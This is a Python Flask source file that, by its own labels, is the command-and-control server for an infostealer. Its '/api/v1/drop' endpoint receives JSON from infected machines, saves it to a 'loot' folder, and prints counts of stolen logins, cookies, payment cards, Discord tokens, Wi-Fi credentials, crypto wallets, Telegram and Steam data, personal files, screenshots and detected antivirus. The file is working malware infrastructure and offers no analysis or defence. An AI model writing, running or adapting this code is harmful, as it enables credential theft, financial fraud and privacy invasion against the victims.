from flask import Flask, request
import json, datetime, os

app = Flask(__name__)
app.config['MAX_CONTENT_LENGTH'] = 200 * 1024 * 1024
os.makedirs("loot", exist_ok=True)


@app.route("/api/v1/drop", methods=["POST"])
def drop():
    data = request.get_json(force=True, silent=True) or {}
    system = data.get("system", {}) or {}
    host = system.get("hostname") or data.get("hostname") or "unknown"
    user = system.get("username", "")
    osv = system.get("os", "")
    av = system.get("av", "")

    ts = datetime.datetime.utcnow().strftime("%Y%m%d_%H%M%S")
    safe_host = "".join(c if c.isalnum() or c in "-_" else "_" for c in host)
    path = f"loot/{safe_host}_{ts}.json"
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2)

    logins  = len(data.get("logins", []))
    cookies = len(data.get("cookies", []))
    cards   = len(data.get("cards", []))
    tokens  = len(data.get("discordTokens", []))
    wifi    = len(data.get("wifi", []))
    wallets = len(data.get("wallets", []))
    tdata   = len(data.get("telegram", []))
    steam   = len(data.get("steam", []))
    desk    = len(data.get("desktopFiles", []))
    docs    = len(data.get("documentFiles", []))
    dls     = len(data.get("downloadFiles", []))
    shot    = len(data.get("screenshot", ""))
    size_kb = os.path.getsize(path) // 1024

    print(f"================================================================")
    print(f"[+] Beacon from {host} ({user}) @ {osv}")
    if av:
        print(f"[!] AV detected: {av}")
    print(f"    logins={logins} cookies={cookies} cards={cards}")
    print(f"    discord_tokens={tokens}  wifi={wifi}")
    print(f"    wallets={wallets}  telegram={tdata}  steam={steam}")
    print(f"    desktop={desk}  documents={docs}  downloads={dls}")
    print(f"    screenshot_b64={shot}  payload={size_kb} KB")
    print(f"    saved -> {path}")
    print(f"================================================================")

    return "", 204


@app.route("/health", methods=["GET"])
def health():
    return {"ok": True, "time": datetime.datetime.utcnow().isoformat()}, 200


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8443))
    print(f"[*] C2 listening on 0.0.0.0:{port}")
    app.run(host="0.0.0.0", port=port, threaded=True)
